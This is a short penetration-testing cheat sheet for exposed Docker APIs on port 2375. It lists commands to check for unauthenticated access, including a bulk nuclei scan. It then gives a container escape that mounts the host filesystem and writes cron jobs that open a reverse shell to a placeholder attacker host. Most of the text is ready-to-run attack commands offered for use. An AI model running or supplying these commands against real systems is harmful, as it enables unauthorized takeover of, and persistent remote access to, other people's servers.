# 2375 - Docker

## Potential Risks

### API Unauthenticated Access

```bash
# RHOST=remoteHost; RPORT=2375
curl $RHOST:$RPORT/version
curl $RHOST:$RPORT/v1.24/version
docker -H tcp://$RHOST:$RPORT version

# Bulk testing
# RHOST_LIST=hosts.txt
nuclei -t ~/ipocs -id docker-api-unauth -l $RHOST_LIST -c 100 -bs 100
```

## Exploitation

### Container Escape

```bash
# Step 1: Create a container using Docker on the target host
# RHOST=remoteHost; RPORT=
docker -H tcp://$RHOST:$RPORT image ls
docker -H tcp://$RHOST:$RPORT pull nginx:latest
docker -H tcp://$RHOST:$RPORT run -it --rm -v /:/mnt nginx:latest /bin/bash
# If there is no network, try adding --network host

# Step 2: Writing crontab to reverse shell (Inside the container)
# EHOST=evilHost; EPORT=6789
echo "* * * * * /bin/bash -i >& /dev/tcp/$EHOST/$EPORT 0>&1" > /mnt/var/spool/cron/root
echo "* * * * * root /bin/bash -i >& /dev/tcp/$EHOST/$EPORT 0>&1" > /mnt/etc/cron.d/santa_revs
echo "* * * * * root /bin/bash -i >& /dev/tcp/$EHOST/$EPORT 0>&1" > /mnt/etc/crontab
```
